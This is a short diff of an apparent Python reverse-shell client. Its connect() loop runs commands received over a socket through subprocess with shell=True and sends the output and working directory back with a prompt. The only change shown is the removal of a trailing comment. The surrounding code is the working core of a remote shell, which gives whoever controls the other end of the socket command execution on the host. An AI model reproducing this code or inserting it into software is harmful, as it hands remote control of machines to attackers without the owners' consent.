@@ -17,7 +17,7 @@ def connect():
             else:
                 cmd = subprocess.Popen(command[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                 output_bytes = cmd.stdout.read() + cmd.stderr.read() # with help of send output or any error if it occue if any
-                output_str = str(output_bytes, "utf-8") # 
+                output_str = str(output_bytes, "utf-8") 
                 s.send(str.encode(output_str + str(os.getcwd()) + '> ')) 
 
 def main ():
